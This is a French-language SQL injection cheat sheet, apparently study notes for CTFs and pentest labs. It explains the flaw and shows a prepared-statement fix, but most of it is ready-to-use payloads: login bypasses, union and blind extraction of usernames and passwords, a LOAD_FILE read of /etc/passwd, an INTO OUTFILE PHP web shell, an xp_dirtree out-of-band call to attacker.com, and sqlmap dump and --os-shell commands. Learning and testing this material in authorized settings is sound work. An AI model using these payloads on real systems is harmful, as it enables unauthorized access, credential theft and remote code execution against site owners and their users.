# üíâ SQL Injection

[‚Üê Retour √† la table des mati√®res](../README.md)

## üîç C'est quoi une SQL Injection ?

Une **SQL injection** arrive quand :
- Une application met directement ton input utilisateur dans une requ√™te SQL
- Sans filtrage ni pr√©paration
- Ce qui te permet de **modifier la requ√™te**

---

## üí° Exemple simple

### Code vuln√©rable
```sql
SELECT * FROM users 
WHERE username = '$user' AND password = '$pass';
```

### Input normal
```
username: admin
password: password123
```

### Input malveillant
```
username: admin'#
password: n'importe quoi
```

### Ce que MySQL voit vraiment
```sql
SELECT * FROM users 
WHERE username = 'admin'#' AND password = 'test';
```

**R√©sultat :** Tout apr√®s `#` est comment√© ‚Üí le test du mot de passe dispara√Æt ‚Üí login r√©ussi !

---

## üîë Commentaires SQL

| Base de donn√©es | Syntaxe | Description |
|-----------------|---------|-------------|
| **MySQL** | `#` | Commente jusqu'√† la fin de ligne |
| **MySQL** | `-- ` | Commentaire (avec espace apr√®s) |
| **PostgreSQL** | `--` | Commentaire |
| **MS SQL** | `--` | Commentaire |
| **Oracle** | `--` | Commentaire |

‚ö†Ô∏è **Important :** Pour `--`, il faut un **espace apr√®s** !

---

## üéØ Bypass de login classiques

### Bypass avec commentaire
```sql
# Dans le champ username :
admin'#

# Dans le champ password :
n'importe quoi
```

**Requ√™te r√©sultante :**
```sql
SELECT * FROM users WHERE username = 'admin'#' AND password = 'xxx';
```

### Bypass avec OR 1=1
```sql
# Dans le champ username :
' OR 1=1#

# Dans le champ password :
n'importe quoi
```

**Requ√™te r√©sultante :**
```sql
SELECT * FROM users WHERE username = '' OR 1=1#' AND password = 'xxx';
```

**Explication :** `1=1` est toujours vrai ‚Üí la condition enti√®re est vraie ‚Üí acc√®s autoris√©

### Bypass avec OR '1'='1'
```sql
# Dans le champ username :
admin' OR '1'='1

# Dans le champ password :
admin' OR '1'='1
```

**Requ√™te r√©sultante :**
```sql
SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' 
AND password = 'admin' OR '1'='1';
```

---

## üî¨ D√©tection de SQL Injection

### Test de base
```
' (apostrophe simple)
'' (deux apostrophes)
" (guillemet double)
```

**Signes de vuln√©rabilit√© :**
- Message d'erreur SQL affich√©
- Comportement diff√©rent de la page
- Temps de r√©ponse anormal

### Payloads de d√©tection
```sql
# Test simple
'

# Test avec commentaire
' OR 1=1#
' OR 1=1--

# Test avec d√©lai (MySQL)
' OR SLEEP(5)#

# Test avec d√©lai (PostgreSQL)
' OR pg_sleep(5)--

# Test avec d√©lai (MS SQL)
'; WAITFOR DELAY '0:0:5'--
```

---

## üõ°Ô∏è Types de SQL Injection

### 1. Error-based (bas√©e sur les erreurs)
```sql
# Forcer une erreur pour obtenir des infos
' AND 1=CONVERT(int, @@version)--
```

### 2. Union-based (extraction de donn√©es)
```sql
# D√©terminer le nombre de colonnes
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
# Continue jusqu'√† obtenir une erreur

# Extraire des donn√©es
' UNION SELECT NULL, NULL, NULL#
' UNION SELECT 1, username, password FROM users#
```

### 3. Blind SQL Injection (aveugle)

#### Boolean-based
```sql
# Test si la condition est vraie ou fausse
' AND 1=1#  (r√©ponse normale)
' AND 1=2#  (r√©ponse diff√©rente)

# Extraire des donn√©es caract√®re par caract√®re
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'#
```

#### Time-based
```sql
# Si aucun changement visible, utiliser des d√©lais
' AND IF(1=1, SLEEP(5), 0)#
' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)#
```

### 4. Out-of-band (OOB)
```sql
# Forcer la base √† faire une requ√™te externe
'; EXEC xp_dirtree '\attacker.com\share'--
```

---

## üîß Payloads courants

### Login bypass
```sql
admin'#
admin'--
' OR 1=1#
' OR 1=1--
' OR 'a'='a
admin' OR '1'='1'#
') OR ('1'='1
```

### Extraction de donn√©es
```sql
# Version de la base
' UNION SELECT @@version#
' UNION SELECT version()#

# Nom de la base courante
' UNION SELECT database()#

# Lister les tables
' UNION SELECT table_name FROM information_schema.tables#

# Lister les colonnes
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'#

# Extraire les donn√©es
' UNION SELECT username, password FROM users#
```

### Lecture de fichiers (MySQL)
```sql
# Lire un fichier
' UNION SELECT LOAD_FILE('/etc/passwd')#

# √âcrire un fichier (si droits suffisants)
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'#
```

---

## üß∞ Outils automatis√©s

### SQLMap
```bash
# Test automatique
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs

# Dump d'une base
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -D database_name --dump

# Avec authentification
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123" --dbs

# Shell OS (si possible)
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

### Burp Suite
1. **Intercepter** la requ√™te avec Burp Proxy
2. **Envoyer** vers Repeater (Ctrl+R)
3. **Tester** les payloads manuellement
4. **Utiliser** Intruder pour automatiser

---

## üìñ Workflow complet

### √âtape 1 : D√©tection
```bash
# Tester avec une apostrophe
username: admin' 
password: test

# Observer la r√©ponse
```

### √âtape 2 : Confirmation
```sql
# Test OR 1=1
username: ' OR 1=1#
password: anything

# Si √ßa fonctionne ‚Üí Vuln√©rable !
```

### √âtape 3 : Exploitation

#### Bypass de login
```sql
admin'#
```

#### Extraction d'informations
```sql
# Nombre de colonnes
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#

# Extraction
' UNION SELECT 1,2,3#
' UNION SELECT username, password, email FROM users#
```

### √âtape 4 : Dump complet (SQLMap)
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dump-all
```

---

## üõ°Ô∏è Pourquoi √ßa marche ?

**Probl√®me :** Concat√©nation de strings non filtr√©es

```php
// Code vuln√©rable (PHP)
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

**Solution :** Requ√™tes pr√©par√©es (Prepared Statements)

```php
// Code s√©curis√© (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

---

## ‚ö†Ô∏è Important

üëâ √Ä utiliser **seulement** dans :
- CTF autoris√©s
- Labs de test
- Environnements de formation
- Tests avec permission explicite

‚ùå **Jamais** sur des syst√®mes r√©els sans autorisation !

---

## üîó Ressources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## üí° M√©mo rapide

```
# Bypass login
admin'#
' OR 1=1#

# D√©tection
' (apostrophe)
' OR 1=1#

# Extraction
' UNION SELECT 1,2,3#
' UNION SELECT username,password FROM users#

# SQLMap
sqlmap -u "URL" --data="params" --dump
```
